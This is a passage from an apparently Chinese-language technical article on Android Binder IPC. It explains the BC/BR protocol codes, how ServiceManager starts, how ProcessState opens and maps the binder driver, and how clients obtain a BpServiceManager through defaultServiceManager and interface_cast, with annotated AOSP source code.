Driver 层传递到 IPC 层； Binder IPC 通信至少是两个进程的交互： client 进程执行 binder_thread_write，根据 BC_XXX 命令，生成相应的 binder_work； server 进程执行 binder_thread_read，根据 binder_work.type 类型，生成 BR_XXX，发送到用户空间处理。 # 通信过程 一次 Client 向 Server 通信的过程如图所示 # BC_PROTOCOL binder 请求码，是用 enum binder_driver_command_protocol 来定义的，是用于应用程序向 binder 驱动设备发送请求消息 请求码 参数类型 作用 BC_TRANSACTION binder_transaction_data Client 向 Binder 驱动发送请求数据 BC_REPLY binder_transaction_data Server 向 Binder 驱动发送请求数据 BC_FREE_BUFFER binder_uintptr_t (指针) 释放内存 BC_INCREFS __u32(descriptor) binder_ref 弱引用加 1 操作 BC_DECREFS __u32(descriptor) binder_ref 弱引用减 1 操作 BC_ACQUIRE __u32(descriptor) binder_ref 强引用加 1 操作 BC_RELEASE __u32(descriptor) binder_ref 强引用减 1 操作 BC_ACQUIRE_DONE binder_ptr_cookie binder_node 强引用减 1 操作 BC_INCREFS_DONE binder_ptr_cookie binder_node 弱引用减 1 操作 BC_REGISTER_LOOPER 无参数 创建新的 looper 线程 BC_ENTER_LOOPER 无参数 应用线程进入 looper BC_EXIT_LOOPER 无参数 应用线程退出 looper BC_REQUEST_DEATH_NOTIFICATION binder_handle_cookie 注册死亡通知 BC_CLEAR_DEATH_NOTIFICATION binder_handle_cookie 取消注册的死亡通知 BC_DEAD_BINDER_DONE binder_uintptr_t (指针) 已完成 binder 的死亡通知 BC_ACQUIRE_RESULT - - BC_ATTEMPT_ACQUIRE - - 当一个进程请求另外一个进程执行一个操作时，源进程就使用 BC_TRANSACTION 来请求 Binder 驱动进程将通信数据传递到目标进程 当目标进程处理完成源进程所请求的操作之后，它就使用 BC_REPLY 来请求 Binder 驱动进程将结果数据传递给源进程 BC_FREE_BUFFER 后面跟的通信数据是一个整数，它指向了在 Binder 驱动进程内部所分配的一块内核缓冲区.Binder 驱动程序就是通过这个内核缓冲区将源进程的通信数据传递到目标进程的。当目标进程处理完成源进程的通信请求之后，它会使用 BC_FREE_BUFFER 来通知 Binder 驱动程序释放这个内核缓冲区 当一个线程将自己注册到 Binder 驱动程序之后，它会使用 BC_ENTER_LOOPER 来通知 Binder 驱动程序，它已经准备就绪处理进程间通信请求了 当 Binder 驱动程序主动请求进程注册一个新的线程到它的 Binder 线程池中来处理进程间通信请求之后，新创建的线程就会使用 BC_REGISTER_LOOPER 来通知 Binder 驱动程序，它准备就绪了 当一个线程要退出时，它使用 BC_EXIT_LOOPER 从 Binder 驱动程序中注销，这样他就不会再接收到进程间通信请求了 如果一个进程希望获得它所引用的 Service 组件的死亡接收通知，那么它需要使用 BC_REQUEST_DEATH_NOTIFICATION 来向 Binder 驱动程序注册一个死亡接收通知 如果一个进程希望注销之前所注册的一个死亡接收通知，那么它需要使用 BC_CLEAR_DEATH_NOTIFICATION 来向 Binder 驱动程序发出请求 当一个进程获得一个 Service 组件的死亡通知时，它会使用 BC_DEAD_BINDER_DONE 来通知 Binder 驱动程序，它已经处理完成该 Service 组件的死亡通知了 # binder_work 结构体 binder_work 用来描述待处理的工作项， binder_work.entry 用来将结构体嵌入到一个宿主结构中，通过 binder_work.type 的取值，Binder 就可以判断出一个 binder_work 结构体嵌入到什么类型的宿主结构中 struct binder_work &#123; struct list_head entry; enum binder_work_type &#123; BINDER_WORK_TRANSACTION = 1,// 最常见 BINDER_WORK_TRANSACTION_COMPLETE, BINDER_WORK_RETURN_ERROR, BINDER_WORK_NODE, BINDER_WORK_DEAD_BINDER, BINDER_WORK_DEAD_BINDER_AND_CLEAR, BINDER_WORK_CLEAR_DEATH_NOTIFICATION, &#125; type;&#125;; binder_work 类型 触发时机 BINDER_WORK_TRANSACTION binder_transaction() ; binder_release_work() 被调用 BINDER_WORK_TRANSACTION_COMPLETE binder_transaction() ; binder_release_work() 被调用 BINDER_WORK_NODE binder_new_node() 被调用 BINDER_WORK_DEAD_BINDER binder_thread_write() 收到 BC_REQUEST_DEATH_NOTIFICATION BINDER_WORK_DEAD_BINDER_AND_CLEAR binder_thread_write() 收到 BC_CLEAR_DEATH_NOTIFICATION BINDER_WORK_CLEAR_DEATH_NOTIFICATION binder_thread_write() 收到 BC_CLEAR_DEATH_NOTIFICATION 和 BC_DEAD_BINDER_DONE # BR_PROTOCOL binder 响应码，是用 enum binder_driver_return_protocol 来定义的，是 binder 设备向应用程序回复的消息 响应码 参数类型 作用 触发时机 BR_ERROR __s32 操作发生错误 BR_OK 无参数 操作完成 BR_NOOP 无参数 不做任何事 BR_SPAWN_LOOPER 无参数 创建新的 Looper 线程 BR_TRANSACTION binder_transaction_data Binder 驱动向 Server 端发送请求数据 收到 BINDER_WORK_TRANSACTION BR_REPLY binder_transaction_data Binder 驱动向 Client 端发送回复数据 收到 BINDER_WORK_TRANSACTION BR_TRANSACTION_COMPLETE 无参数 对请求发送的成功反馈 收到 BINDER_WORK_TRANSACTION_COMPLETE BR_DEAD_REPLY 无参数 回复失败，往往是线程或节点为空 BR_FAILED_REPLY 无参数 回复失败，往往是 transaction 出错导致 BR_INCREFS binder_ptr_cookie binder_ref 弱引用加 1 操作（Server 端） BR_DECREFS binder_ptr_cookie binder_ref 弱引用减 1 操作（Server 端） BR_ACQUIRE binder_ptr_cookie binder_ref 强引用加 1 操作（Server 端） BR_RELEASE binder_ptr_cookie binder_ref 强引用减 1 操作（Server 端） BR_DEAD_BINDER binder_uintptr_t (指针) Binder 驱动向 client 端发送死亡通知 收到 BINDER_WORK_DEAD_BINDER 或 BINDER_WORK_DEAD_BINDER_AND_CLEAR BR_CLEAR_DEATH_NOTIFICATION_DONE binder_uintptr_t (指针) BC_CLEAR_DEATH_NOTIFICATION 命令对应的响应码 收到 BINDER_WORK_CLEAR_DEATH_NOTIFICATION BR_ACQUIRE_RESULT - - BR_ATTEMPT_ACQUIRE - - BR_FINISHED - - # 协议转换图 BINDER_WORK_xxx –&gt; BW_xxx 图解：(以 BC_TRANSACTION 为例) 发起端进程：binder_transaction () 过程将 BC_TRANSACTION 转换为 BW_TRANSACTION； 接收端进程：binder_thread_read () 过程，将 BW_TRANSACTION 转换为 BR_TRANSACTION; 接收端进程：IPC.executeCommand () 过程，处理 BR_TRANSACTION 命令。 # ServiceManager 介绍 我们知道在 Android 系统中，各个进程之间都是隔离的，假如 Clinet 想和 Server 通信，那么该如何找到 Server 呢？这就需要依靠 ServiceManager 了 ServiceManager 是 Android 进程间通信机制 Binder 的守护进程，它扮演着 Binder 进程间通信机制上下文管理者 (context Manager) 的角色，同时负责管理系统中的 Service 组件，向 Client 组件提供获取 Service 代理对象的服务 我们可以将 binder 跨进程通信和 socket 网络通信类比，在网络通信中，客户端并不知道服务器的 IP 地址，但是知道服务器的域名，现在客户端想要和服务器建立 socket 连接，那么通信的第一步就是通过 DNS 服务器将域名解析为 IP 地址然后层层路由，这样客户端就可以和服务器建立网络连接了。binder 跨进程通信也不例外，ServiceManager 就相当于是 socket 网络通信中的 DNS 服务器，倘若 Server 希望有人能够和它通信，那么 Server 就先前往 Service Manager 那里 “备案” 一下（1. 注册服务），过了不久，Client 想要和 Server 去通信了，它就去询问 Service Manager：“Server 在什么地方呀，我要怎么和它通信呀”（2. 获取服务），然后 Service Manager 就告诉 Client 通信的方法，这样 Clinet 和 Server 就可以愉快的通信了～（3. 使用服务） # ServiceManager 的启动过程 ServiceManager 是由 init 进程通过解析 init.rc 文件创建的 # platform\\system\\core\\rootdir\\init.rc on init ... # Start essential services. start servicemanager 具体的服务声明在 platform\\frameworks\\native\\cmds\\servicemanager\\servicemanager.rc # platform\\frameworks\\native\\cmds\\servicemanager\\servicemanager.rc service servicemanager /system/bin/servicemanager class core animation# 指定了服务的类别为core和animation user system# 指定了服务用户为system,表示该服务将以系统用户的权限来运行 group system readproc# 指定了服务的用户组为system,并具有 readproc 权限 critical# 标志该服务为关键服务，这表示它是系统启动的一部分，必须优先启动 # 要求在servicemanager重新启动时重启 # apexd服务, audioserver服务, gatekeeperd服务 # main类别的服务, hal类别的服务, early_hal类别的服务 onrestart restart apexd onrestart restart audioserver onrestart restart gatekeeperd onrestart class_restart main onrestart class_restart hal onrestart class_restart early_hal # 将 servicemanager 的进程 ID 写入 # /dev/cpuset/system-background/tasks文件，这可用于CPU集合管理 writepid /dev/cpuset/system-background/tasks # 声明该服务为关键服务，在系统关闭时，这个服务将被优先关闭 shutdown critical Service Manager 的入口函数是 main.cpp 中的 main() , 它的启动过程由以下四个步骤组成 调用 ProcessState::initWithDriver 打开并映射 binder 驱动设备 将自身作为服务 (服务名称: manager ) 注册到 ServiceManager 中 调用 ps-&gt;becomeContextManager(); 成为 binder 进程间通信机制的上下文管理者 使用 looper 无限循环阻塞处理事件 //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppint main(int argc, char** argv) &#123; if (argc > 2) &#123; LOG(FATAL) &lt;&lt; \"usage: \" &lt;&lt; argv[0] &lt;&lt; \" [binder driver]\"; &#125; // 指定 driver 的名称，如果无参数，则使用默认驱动 /dev/binder const char* driver = argc == 2 ? argv[1] : \"/dev/binder\"; /* 每一个进程只能有一个 ProcessState 对象，service manager 通过 initWithDriver 方法 实例化了一个 ProcessState 对象，并打开 binder 设备和进行 mmap 内存映射，这个过程中 将会同时调用 binder 设备内部的函数 binder_open 和 binder_mmap */ sp&lt;ProcessState> ps = ProcessState::initWithDriver(driver); // 设置可以同时存在的线程池的最大数量为 0, 即此时只能有 ServiceManager 这一个线程存在 ps->setThreadPoolMaxThreadCount(0); // 在阻塞调用时中止进程 //FATAL_IF_NOT_ONEWAY: ServiceManager 发起的 Binder 调用必须是单向，否则打印堆栈日志提示 ps->setCallRestriction(ProcessState::CallRestriction::FATAL_IF_NOT_ONEWAY); // 实例化 ServiceManager, 初始化参数为 Access 对象的智能指针 sp&lt;ServiceManager> manager = sp&lt;ServiceManager>::make(std::make_unique&lt;Access>()); //self register servicemanager,\"manager\" 将作为 servicemanager 的第一个服务被注册 if (!manager->addService(\"manager\", manager, false /*allowIsolated*/, IServiceManager::DUMP_FLAG_PRIORITY_DEFAULT).isOk()) &#123; LOG(ERROR) &lt;&lt; \"Could not self register servicemanager\"; &#125; // 将 \"manager\" 服务作为服务端 Bbinder 对象 IPCThreadState::self()->setTheContextObject(manager); // 向 binder 驱动发送 ioctl BINDER_SET_CONTEXT_MGR_EXT 信号，将 servicemanager // 在 ProcessState::initWithDriver 中打开驱动设备 /dev/driver 所返回的文件描述符句柄 // 作为整个 binder IPC 通信中的上下文管理者 ps->becomeContextManager(); // 准备 looper sp&lt;Looper> looper = Looper::prepare(false /*allowNonCallbacks*/); // 监听 BC_ENTER_LOOPER 信号，收到该信号后回调处理 binder 调用 BinderCallback::setupTo(looper); // 监听客户端回调 ClientCallbackCallback::setupTo(looper, manager); // 阻塞等待和处理事件 while(true) &#123; looper->pollAll(-1); &#125; // should not be reached return EXIT_FAILURE;&#125;# ProcessState::init //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppsp&lt;ProcessState> ProcessState::self()&#123; return init(kDefaultDriver, false /*requireDefault*/);&#125;sp&lt;ProcessState> ProcessState::initWithDriver(const char* driver)&#123; return init(driver, true /*requireDefault*/);&#125;sp&lt;ProcessState> ProcessState::init(const char *driver, bool requireDefault)&#123; [[clang::no_destroy]] static sp&lt;ProcessState> gProcess; [[clang::no_destroy]] static std::mutex gProcessMutex; if (driver == nullptr) &#123; std::lock_guard&lt;std::mutex> l(gProcessMutex); return gProcess; &#125; /* 这里使用了单例模式的设计思想，通过 std::once_flag 和 std::call_once 来保证只有一个线程可以进入初始化代码块， 这保证了在一个线程中只能有一个 ProcessState 实例 它的工作方式如下 [-] 第一次调用 std::call_once 时，它会检查与 std::once_flag 关联的标记是否已被设置。 如果标记尚未设置，它将执行传递给 std::call_once 的可调用对象， 并设置标记，以标记初始化已完成。 [-] 如果其他线程尝试再次调用 std::call_once 与相同的 std::once_flag， 它会发现标记已经设置，因此不会再次执行可调用对象。 */ [[clang::no_destroy]] static std::once_flag gProcessOnce; std::call_once(gProcessOnce, [&amp;]()&#123; // 判断 binder 驱动是否存在 if (access(driver, R_OK) == -1) &#123; ALOGE(\"Binder driver %s is unavailable. Using /dev/binder instead.\", driver); driver = \"/dev/binder\"; &#125; std::lock_guard&lt;std::mutex> l(gProcessMutex); // 将 driver 作为参数实例化 ProcessState, 并赋值给 gProcess gProcess = sp&lt;ProcessState>::make(driver); &#125;); if (requireDefault) &#123; // Detect if we are trying to initialize with a different driver, and // consider that an error. ProcessState will only be initialized once above. LOG_ALWAYS_FATAL_IF(gProcess->getDriverName() != driver, \"ProcessState was already initialized with %s,\" \" can't initialize with %s.\", gProcess->getDriverName().c_str(), driver); &#125; return gProcess;&#125;# ProcessState 构造函数 在代码的第 26 行，通过 driver 参数实例化了 ProcessState, 它通过 open_driver() 打开了 binder 驱动设备，并使用 mmap 来进行内存映射 //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppProcessState::ProcessState(const char *driver) : mDriverName(String8(driver)) , mDriverFD(open_driver(driver))// 通过系统调用陷入内核，打开 /dev/binder 设备 , mVMStart(MAP_FAILED)// 映射内存的起始地址 , mThreadCountLock(PTHREAD_MUTEX_INITIALIZER) , mThreadCountDecrement(PTHREAD_COND_INITIALIZER) , mExecutingThreadsCount(0) , mWaitingForThreads(0) , mMaxThreads(DEFAULT_MAX_BINDER_THREADS) , mStarvationStartTimeMs(0) , mThreadPoolStarted(false) , mThreadPoolSeq(1) , mCallRestriction(CallRestriction::NONE)&#123; if (mDriverFD >= 0) &#123; // mmap the binder, providing a chunk of virtual address space to receive transactions. // 调用内存映射函数 mmap, 此时 binder 驱动会在内核空间执行 binder_mmap, 来将一块物理内存同时映射到 // 用户空间和内核空间，来帮助进行跨进程通信 // #define BINDER_VM_SIZE ((1 * 1024 * 1024) - sysconf(_SC_PAGE_SIZE) * 2) = 1016KB // PAGE_SIZE 被定义为 4096 mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0); if (mVMStart == MAP_FAILED) &#123; // *sigh* ALOGE(\"Using %s failed: unable to mmap transaction memory.\\n\", mDriverName.c_str()); close(mDriverFD); mDriverFD = -1; mDriverName.clear(); &#125; &#125;#ifdef __ANDROID__ LOG_ALWAYS_FATAL_IF(mDriverFD &lt; 0, \"Binder driver '%s' could not be opened. Terminating.\", driver);#endif&#125;# open_driver //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppstatic int open_driver(const char *driver)&#123; // 以读写方式打开，并为该文件描述符添加 close-on-exec (执行时可关闭) 的标志， // 来防止该文件描述符被意外泄漏给了 fork 创建出来的子进程 int fd = open(driver, O_RDWR | O_CLOEXEC); if (fd >= 0) &#123; int vers = 0; status_t result = ioctl(fd, BINDER_VERSION, &amp;vers); if (result == -1) &#123; ALOGE(\"Binder ioctl to obtain version failed: %s\", strerror(errno)); close(fd); fd = -1; &#125; if (result != 0 || vers != BINDER_CURRENT_PROTOCOL_VERSION) &#123; ALOGE(\"Binder driver protocol(%d) does not match user space protocol(%d)! ioctl() return value: %d\", vers, BINDER_CURRENT_PROTOCOL_VERSION, result); close(fd); fd = -1; &#125; // 设置这个打开的 binder 对象的最大线程数为 15 size_t maxThreads = DEFAULT_MAX_BINDER_THREADS; result = ioctl(fd, BINDER_SET_MAX_THREADS, &amp;maxThreads); if (result == -1) &#123; ALOGE(\"Binder ioctl to set max threads failed: %s\", strerror(errno)); &#125; uint32_t enable = DEFAULT_ENABLE_ONEWAY_SPAM_DETECTION; result = ioctl(fd, BINDER_ENABLE_ONEWAY_SPAM_DETECTION, &amp;enable); if (result == -1) &#123; ALOGD(\"Binder ioctl to enable oneway spam detection failed: %s\", strerror(errno)); &#125; &#125; else &#123; ALOGW(\"Opening '%s' failed: %s\\n\", driver, strerror(errno)); &#125; return fd;&#125;# 总结 # Binder 中各个类的含义 在进行后续的学习前，我们先来了解一下 Binder 中各个类的含义 类名 说明 BpRefBase RefBase 的子类，提供 remote () 方法获取远程 Binder IInterface Binder 服务接口的基类，Binder 服务通常需要同时提供本地接口和远程接口 BpInterface 远程接口的基类，远程接口是供客户端调用的接口集 BnInterface 本地接口的基类，本地接口是需要服务中真正实现的接口集 IBinder Binder 对象的基类，BBinder 和 BpBinder 都是这个类的子类 BpBinder 远程 Binder，这个类提供 transact 方法来发送请求，BpXXX 实现中会用到 BBinder 本地 Binder，服务实现方的基类，提供了 onTransact 接口来接收请求 ProcessState 代表了使用 Binder 的进程 IPCThreadState 代表了使用 Binder 的线程，这个类中封装了与 Binder 驱动通信的逻辑 Parcel 在 Binder 上传递的数据的包装器 Binder 服务的实现类通常都会遵守下面的命名规则 服务的接口使用 I 字母作为前缀 远程接口使用 Bp 作为前缀 本地接口使用 Bn 作为前缀 p 即 proxy 的意思，是客户端用来与 Server 交互的类 IBinder 家族 BpBinder 和 BBinder 都是 Android 中与 Binder 通信相关的代表，它们都从 IBinder 类中派生而来 BpBinder 是客户端用来与 Server 交互的代理类，p 即 proxy 的意思 BBinder 则是 proxy 相对的一端，它是 proxy 交互的目的端。如果说 BpBinder 代表客户端，那么 BBinder 则代表服务端。这里的 BpBinder 和 BBinder 是一一对应的，即某个 BpBinder 只能和对应的 BBinder 交互 在注册服务和获取服务的过程中，ServiceManager 均为服务端 BpBinder 通过 handle 来标识它所对应的 BBinder 端，与其相关的函数为 sp&lt;IBinder&gt; ProcessState::getStrongProxyForHandle(int32_t handle) ,handle 值为 0 表示 ServiceManager 所对应的 BBinder IServiceManager 家族 IServiceManager、BpServiceManager 和 BnServiceManager 都与业务逻辑相关。 BnServiceManager 同时从 BBinder 派生，表示它可以直接参与 Binder 通信。 BpServiceManager 虽然从 BpInterface 中派生，但是这条分支似乎与 BpBinder 没有关系。 BnServiceManager 是一个虚类，它的业务函数最终需要子类来实现。 # ServiceManager 的获取过程 当一个 Server 想要注册服务，那必须要知道 &quot;ServiceManager 在哪里才可以&quot;, 所以需要有一个方法来让 Server 找到 ServiceManager, 这是通过函数 defaultServiceManager 实现的 // 获取 BpServiceManager 对象sp&lt;IServiceManager> sm(defaultServiceManager());defaultServiceManager 的主要作用是获取 BpServiceManager 对象，它通过 getContextObject 获取到了 ServiceManager 的 BBinder 所对应的 BpBinder 对象，随后利用 interface_cast 将 BpBinder 对象转换成了 BpServiceManager 对象 //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppsp&lt;IServiceManager> defaultServiceManager()&#123; std::call_once(gSmOnce, []() &#123; sp&lt;AidlServiceManager> sm = nullptr; while (sm == nullptr) &#123; // 获取 ServiceManager 的 BBinder 所对应的 BpBinder 对象， // 并将该对象通过 interface_cast 转换为 AidlServiceManager sm = interface_cast&lt;AidlServiceManager>(ProcessState::self()->getContextObject(nullptr)); if (sm == nullptr) &#123; ALOGE(\"Waiting 1s on context object on %s.\", ProcessState::self()->getDriverName().c_str()); sleep(1); &#125; &#125; // 实例化 ServiceManagerShim gDefaultServiceManager = sp&lt;ServiceManagerShim>::make(sm); &#125;); return gDefaultServiceManager;&#125;AidlServiceManager AidlServiceManager 其实是 android::os::IServiceManager 的别名 using AidlServiceManager = android::os::IServiceManager;ServiceManagerShim 之前是没有 ServiceManagerShim 的，而是直接操作 BpServiceManager，这个辅助类封装了 AIDL 自动生成的 BpServiceManager，所以现在的客户端代码流就变成如下三步： 1. 用户代码 2. libbinder代码 binder/IServiceManager.cpp#ServiceManagerShim3. AIDL 代码 android/os/IServiceManager.cpp#BpServiceManager 接口libbinder 中的 ServiceManagerShim 起到了一个中转的作用，把请求转给 out 下 AIDL 自动生成的 BpServiceManager, 原来是在 libbinder#IServiceManager.cpp 中手写实现，现在是 AIDL 帮你实现。 //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cpp// From the old libbinder IServiceManager interface to IServiceManager.class ServiceManagerShim : public IServiceManager&#123;public: explicit ServiceManagerShim (const sp&lt;AidlServiceManager>&amp; impl); sp&lt;IBinder> getService(const String16&amp; name) const override; sp&lt;IBinder> checkService(const String16&amp; name) const override; status_t addService(const String16&amp; name, const sp&lt;IBinder>&amp; service, bool allowIsolated, int dumpsysPriority) override; Vector&lt;String16> listServices(int dumpsysPriority) override; sp&lt;IBinder> waitForService(const String16&amp; name16) override; bool isDeclared(const String16&amp; name) override; Vector&lt;String16> getDeclaredInstances(const String16&amp; interface) override; std::optional&lt;String16> updatableViaApex(const String16&amp; name) override; // for legacy ABI const String16&amp; getInterfaceDescriptor() const override &#123; return mTheRealServiceManager->getInterfaceDescriptor(); &#125; IBinder* onAsBinder() override &#123; return IInterface::asBinder(mTheRealServiceManager).get(); &#125;private: sp&lt;AidlServiceManager> mTheRealServiceManager;&#125;;# getContextObject 这个函数最主要的功能就是获取 ServiceManager 的 BBinder 所对应的 BpBinder 对象，它通过调用 getStrongProxyForHandle(0) 来进行获取 这里传入的 handle 的值为 0, 它表示 ServiceManager 所对应的 BBinder //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppsp&lt;IBinder> ProcessState::getContextObject(const sp&lt;IBinder>&amp; /*caller*/)&#123; // 创建一个 BpBinder 对象，getStrongProxyForHandle 传入的参数 handle 的值为 0 //,0 代表的就是 ServiceManager 所对应的 BBinder。 sp&lt;IBinder> context = getStrongProxyForHandle(0); if (context) &#123; // The root object is special since we get it directly from the driver, it is never // written by Parcell::writeStrongBinder. internal::Stability::markCompilationUnit(context.get()); &#125; else &#123; ALOGW(\"Not able to get context object on %s.\", mDriverName.c_str()); &#125; return context;&#125;getStrongProxyForHandle(0) //platform\\frameworks\\native\\libs\\binder\\ProcessState.cppsp&lt;IBinder> ProcessState::getStrongProxyForHandle(int32_t handle)&#123; sp&lt;IBinder> result; AutoMutex _l(mLock); // 根据索引查找对应资源。 handle_entry* e = lookupHandleLocked(handle); // 如果 lookupHandleLocked 发现没有对应的资源项，则会创建一个新的项并返回。 if (e != nullptr) &#123; // We need to create a new BpBinder if there isn't currently one, OR we // are unable to acquire a weak reference on this current one. The // attemptIncWeak() is safe because we know the BpBinder destructor will always // call expungeHandle(), which acquires the same lock we are holding now. // We need to do this because there is a race condition between someone // releasing a reference on this BpBinder, and a new reference on its handle // arriving from the driver. IBinder* b = e->binder; if (b == nullptr || !e->refs->attemptIncWeak(this)) &#123; if (handle == 0) &#123; // Special case for context manager... // The context manager is the only object for which we create // a BpBinder proxy without already holding a reference. // Perform a dummy transaction to ensure the context manager // is registered before we create the first local reference // to it (which will occur when creating the BpBinder). // If a local reference is created for the BpBinder when the // context manager is not present, the driver will fail to // provide a reference to the context manager, but the // driver API does not return status. // // Note that this is not race-free if the context manager // dies while this code runs. // // TODO: add a driver API to wait for context manager, or // stop special casing handle 0 for context manager and add // a driver API to get a handle to the context manager with // proper reference counting. IPCThreadState* ipc = IPCThreadState::self(); CallRestriction originalCallRestriction = ipc->getCallRestriction(); ipc->setCallRestriction(CallRestriction::NONE); Parcel data; status_t status = ipc->transact( 0, IBinder::PING_TRANSACTION, data, nullptr, 0); ipc->setCallRestriction(originalCallRestriction); if (status == DEAD_OBJECT) return nullptr; &#125; // 创建一个 BpBinder sp&lt;BpBinder> b = BpBinder::create(handle); e->binder = b.get(); if (b) e->refs = b->getWeakRefs(); result = b; &#125; else &#123; // This little bit of nastyness is to allow us to add a primary // reference to the remote proxy when this team doesn't have one // but another team is sending the handle to us. result.force_set(b); e->refs->decWeak(this); &#125; &#125; return result;&#125;# interface_cast //platform\\frameworks\\native\\libs\\binder\\include\\binder\\IInterface.h/** * If this is a local object and the descriptor matches, this will return the * actual local object which is implementing the interface. Otherwise, this will * return a proxy to the interface without checking the interface descriptor. * This means that subsequent calls may fail with BAD_TYPE. */template&lt;typename INTERFACE>inline sp&lt;INTERFACE> interface_cast(const sp&lt;IBinder>&amp; obj)&#123; return INTERFACE::asInterface(obj);&#125;这是一个模板函数，其中的 asInterface 是在 DECLARE_META_INTERFACE 宏中定义的 asInterface //platform\\frameworks\\native\\include\\binder\\IInterface.h//## 的作用是将前后两个标识符或符号连接在一起，以形成一个单独的标识符或符号。// 如 #define CONCATENATE (x, y) x##y// 如果调用 CONCATENATE (a, b)，它将被展开为 ab#define DECLARE_META_INTERFACE(INTERFACE) \\public: \\ static const ::android::String16 descriptor; \\ static ::android::sp&lt;I##INTERFACE> asInterface( \\ const ::android::sp&lt;::android::IBinder>&amp; obj); \\ virtual const ::android::String16&amp; getInterfaceDescriptor() const; \\ I##INTERFACE(); \\ virtual ~I##INTERFACE(); \\ static bool setDefaultImpl(std::unique_ptr&lt;I##INTERFACE> impl); \\ static const std::unique_ptr&lt;I##INTERFACE>&amp; getDefaultImpl(); \\private: \\ static std::unique_ptr&lt;I##INTERFACE> default_impl; \\public: \\#define IMPLEMENT_META_INTERFACE(INTERFACE, NAME) \\ DO_NOT_DIRECTLY_USE_ME_IMPLEMENT_META_INTERFACE(INTERFACE, NAME) \\ #define DO_NOT_DIRECTLY_USE_ME_IMPLEMENT_META_INTERFACE(INTERFACE, NAME)\\ const ::android::StaticString16 \\ I##INTERFACE##_descriptor_static_str16(__IINTF_CONCAT(u, NAME));\\ const ::android::String16 I##INTERFACE::descriptor( \\ I##INTERFACE##_descriptor_static_str16); \\ const ::android::String16&amp; \\ I##INTERFACE::getInterfaceDescriptor() const &#123; \\ return I##INTERFACE::descriptor; \\ &#125; \\ ::android::sp&lt;I##INTERFACE> I##INTERFACE::asInterface( \\ const ::android::sp&lt;::android::IBinder>&amp; obj) \\ &#123; \\ ::android::sp&lt;I##INTERFACE> intr; \\ if (obj != nullptr) &#123; \\ intr = ::android::sp&lt;I##INTERFACE>::cast( \\ obj->queryLocalInterface(I##INTERFACE::descriptor)); \\ if (intr == nullptr) &#123; \\ intr = ::android::sp&lt;Bp##INTERFACE>::make(obj); \\ &#125; \\ &#125; \\ return intr; \\ &#125; \\ std::unique_ptr&lt;I##INTERFACE> I##INTERFACE::default_impl; \\ bool I##INTERFACE::setDefaultImpl(std::unique_ptr&lt;I##INTERFACE> impl)\\ &#123; \\ /* Only one user of this interface can use this function */ \\ /* at a time. This is a heuristic to detect if two different */ \\ /* users in the same process use this function. */ \\ assert(!I##INTERFACE::default_impl); \\ if (impl) &#123; \\ I##INTERFACE::default_impl = std::move(impl); \\ return true; \\ &#125; \\ return false; \\ &#125; \\ const std::unique_ptr&lt;I##INTERFACE>&amp; I##INTERFACE::getDefaultImpl() \\ &#123; \\ return I##INTERFACE::default_impl; \\ &#125; \\ I##INTERFACE::I##INTERFACE() &#123; &#125; \\ I##INTERFACE::~I##INTERFACE() &#123; &#125; \\我们将 interface_cast&lt;AidlServiceManager&gt;(new BpBinder(0)) 通过宏定义替换一下看的会更加清楚，在这里 asInterface 将 BpBinder 转换成了 BpServiceManager , BpServiceManager 继承了 IServiceManager public:static const ::android::String16 descriptor;static ::android::sp&lt;IServiceManager> asInterface( const ::android::sp&lt;::android::IBinder>&amp; obj);virtual const ::android::String16&amp; getInterfaceDescriptor() const;IServiceManager();virtual ~IServiceManager();static bool setDefaultImpl(std::unique_ptr&lt;IServiceManager> impl);static const std::unique_ptr&lt;IServiceManager>&amp; getDefaultImpl();private:static std::unique_ptr&lt;IServiceManager> default_impl;public:const ::android::StaticString16 IServiceManager_descriptor_static_str16(__IINTF_CONCAT(u, android.os.IServiceManager));const ::android::String16 IServiceManager::descriptor( IServiceManager_descriptor_static_str16);const ::android::String16&amp; IServiceManager::getInterfaceDescriptor() const &#123; return IServiceManager::descriptor;&#125;// 在这里终于出现了 asInterface 函数的定义，我们也找到了 BpServiceManager 这个类::android::sp&lt;IServiceManager> IServiceManager::asInterface( const ::android::sp&lt;::android::IBinder>&amp; obj)&#123; ::android::sp&lt;IServiceManager> intr; if (obj != nullptr) &#123; intr = ::android::sp&lt;IServiceManager>::cast( obj->queryLocalInterface(IServiceManager::descriptor)); if (intr == nullptr) &#123; intr = ::android::sp&lt;BpServiceManager>::make(obj); &#125; &#125; return intr;&#125;std::unique_ptr&lt;IServiceManager> IServiceManager::default_impl;bool IServiceManager::setDefaultImpl(std::unique_ptr&lt;IServiceManager> impl)&#123; /* Only one user of this interface can use this function */ /* at a time. This is a heuristic to detect if two different */ /* users in the same process use this function. */ assert(!IServiceManager::default_impl); if (impl) &#123; IServiceManager::default_impl = std::move(impl); return true; &#125; return false;&#125;const std::unique_ptr&lt;IServiceManager>&amp; IServiceManager::getDefaultImpl()&#123; return IServiceManager::default_impl;&#125;IServiceManager::IServiceManager() &#123; &#125;IServiceManager::~IServiceManager() &#123; &#125;# 总结 # Server 向 ServiceManager 注册服务 这里以 MediaServer 为例来分析 Server 向 ServiceManager 注册服务的过程 //platform\\frameworks\\av\\media\\mediaserver\\main_mediaserver.cppint main(int argc __unused, char **argv __unused)&#123; signal(SIGPIPE, SIG_IGN); // 创建一个 ProcessState 实例，打开默认驱动 /dev/binder 并进行 mmap 内存映射 // 此方法的详细分析请参见右侧目录 ServiceManager 的启动过程 ->ProcessState::init sp&lt;ProcessState> proc(ProcessState::self()); // 客户端获取 ServiceManagerShim 对象 // 此方法的详细分析请参见右侧目录 ServiceManager 的获取过程 sp&lt;IServiceManager> sm(defaultServiceManager()); ALOGI(\"ServiceManager: %p\", sm.get()); // 注册 media.player 服务 MediaPlayerService::instantiate(); ResourceManagerService::instantiate(); registerExtensions(); ::android::hardware::configureRpcThreadpool(16, false); // 启动线程池 ProcessState::self()->startThreadPool(); // 将线程加入线程池 IPCThreadState::self()->joinThreadPool(); ::android::hardware::joinRpcThreadpool();&#125;MediaPlayerService::instantiate 这个函数的作用就是调用 defaultServiceManager 的 addService 方法来添加向 ServiceManager 注册服务 //platform\\frameworks\\av\\media\\libmediaplayerservice\\MediaPlayerService.cppvoid 